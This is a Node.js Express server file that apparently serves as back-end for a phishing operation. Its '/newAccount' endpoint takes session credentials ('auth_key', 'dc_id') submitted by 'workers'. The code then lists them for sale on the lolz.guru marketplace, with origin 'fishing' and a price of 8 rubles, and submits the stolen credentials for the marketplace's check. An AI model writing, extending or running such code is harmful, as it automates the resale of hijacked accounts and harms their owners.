const express = require("express");
const { ref, get, child, set, update } = require("firebase/database");

const config = require("../config");
const app = express();
const db = require("../database");
const axios = require("axios");

app.use(express.json());

let updates = [];
let selledAccs = [];
let accsQueue = [];

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

app.get("/getUpdates", async (req, res) => {
    res.status(200).send(updates);
    updates = []
})


const generateId = (symbolsCount) =>
{
    let string = "";
    for(let i = 0; i < symbolsCount; i += 1)
    {
        string += Math.floor(Math.random() * 9) + 1;;
    }

    return string;
}

app.post("/newAccount", async(req, res) =>
{
    const { worker_id, auth_key, dc_id } = req.body;
    console.log(worker_id)
    console.log(auth_key)
    console.log(dc_id)

    res.status(200).send({})

    const id = generateId(7);

    updates.push({type: "newAccount", worker_id, id});
    console.log(updates);

    accsQueue.push(id);

    while(accsQueue[0] != id) {
        await sleep(100);
        continue;
    }

    let accountData;

    while(true) {
        try {
            accountData = await axios.post(`https://api.lolz.guru/market/item/add`, null, {params: {
                    "category_id": 24,
                    "currency": "rub",
                    "item_origin": "fishing",
                    "extended_guarantee": 0,
                    "price": 8,
                    "title": "ПОД ЛЮБЫЕ ЦЕЛИ // ЛУЧШЕЕ КАЧЕСТВО // 8 рублей",
                    "title_en": "FOR ANY PURPOSE // BEST QUALITY // 8 rub"
            }, headers: {"Authorization": `Bearer ${config.lolzToken}`}})

            break;
        }
        catch (e)
        {
            await sleep(500);
            continue;
        }
    }

    await sleep(2000);

    console.log(accountData.data)
    const { item_id } = accountData.data.item;

    let accountChecked = "0";

    while(true){
        try {
            accountChecked = await axios.post(`https://api.lolz.guru/market/${item_id}/goods/check`, null,{ params: {
                login: auth_key,
                password: dc_id
            }, headers: {"Authorization": `Bearer ${config.lolzToken}`}});

            console.log("!");

            break;
        }
        catch(e) {
            await sleep(500);
        }
    }

    console.log(accountChecked)
    if(accountChecked.data?.status != "ok") accountChecked = "0";

    if(accountChecked == "0") return;

    accsQueue.splice(0, 1);
})

app.listen(5000);